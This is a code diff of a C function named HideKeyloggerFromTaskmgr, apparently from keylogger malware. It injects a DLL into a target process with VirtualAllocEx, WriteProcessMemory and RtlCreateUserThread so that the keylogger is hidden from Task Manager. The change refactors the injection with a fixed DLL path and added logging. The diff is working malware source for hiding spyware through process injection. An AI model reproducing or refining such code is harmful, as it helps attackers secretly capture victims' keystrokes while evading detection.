@@ -3,27 +3,33 @@
 
 HANDLE HideKeyloggerFromTaskmgr(DWORD procID)
 {
-    char cwd[MAX_PATH];
-    char *dllPath = NULL;
     HANDLE hThread;
-    HANDLE procHandle = OpenProcess(PROCESS_ALL_ACCESS, TRUE, procID);
-    if (procHandle == NULL) return NULL;
-    GetCurrentDirectory((DWORD)MAX_PATH, (LPSTR)&cwd);
-    size_t totalLenSvcBinPath = strlen(cwd) + (size_t)1 + strlen(DLL_NAME) + (size_t)1; 
-    dllPath = malloc(totalLenSvcBinPath);
-    if (dllPath == NULL) return NULL;
-    strcpy_s(dllPath, totalLenSvcBinPath, cwd);
-    strcat_s(dllPath, totalLenSvcBinPath, "\\");
-    strcat_s(dllPath, totalLenSvcBinPath, DLL_NAME);
-    LPVOID baseAddr = VirtualAllocEx(procHandle, NULL, strlen(dllPath) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    if (baseAddr == NULL)
+
+    if (PathFileExistsA((LPCSTR)DLL_PATH) == FALSE)
     {
-        REEF(dllPath);
+        log("unable to find the dll, maybe it was not copied.");
         return NULL;
     }
-    WriteProcessMemory(procHandle, baseAddr, dllPath, strlen(dllPath) + 1, NULL);
+    HANDLE procHandle = OpenProcess(PROCESS_ALL_ACCESS, TRUE, procID);
+    if (procHandle == NULL)
+    {
+        log("Proc Handle is NULL. OpenProcess failed");
+        return NULL;   
+    }
+    LPVOID baseAddr = VirtualAllocEx(procHandle, NULL, strlen(DLL_PATH) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (baseAddr == NULL)
+    {
+        log("baseAddr is NULL. VirtualAllocEx failed");
+        return NULL;
+    }
+    BOOL success = WriteProcessMemory(procHandle, baseAddr, DLL_PATH, strlen(DLL_PATH) + 1, NULL);
+    if (success == FALSE)
+    {
+        log("WriteProcessMemory failed");
+        return NULL;
+    }
     HMODULE ntdll=LoadLibrary("ntdll.dll");
-    RtlCreateUserThread=(_RtlCreateUserThread)(LPVOID)GetProcAddress(ntdll,"RtlCreateUserThread");
+    RtlCreateUserThread=(_RtlCreateUserThread)((LPVOID)GetProcAddress(ntdll,"RtlCreateUserThread"));
     LPVOID loadLib = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
     NTSTATUS status = RtlCreateUserThread(
         procHandle,
@@ -37,7 +43,9 @@ HANDLE HideKeyloggerFromTaskmgr(DWORD procID)
         &hThread,
         NULL
     );
-    if (NT_SUCCESS(status) == 0)    printf("RtlCreateUserThread failed: 0x%08X\n", (unsigned int)status);
-    REEF(dllPath);
+    if (NT_SUCCESS(status) == 0)
+        log("RtlCreateUserThread failed");
+        // printf("RtlCreateUserThread failed: 0x%08X\n", (unsigned int)status);
+    log("HideKeyloggerFromTaskmgr successfull");
     return hThread;
 }
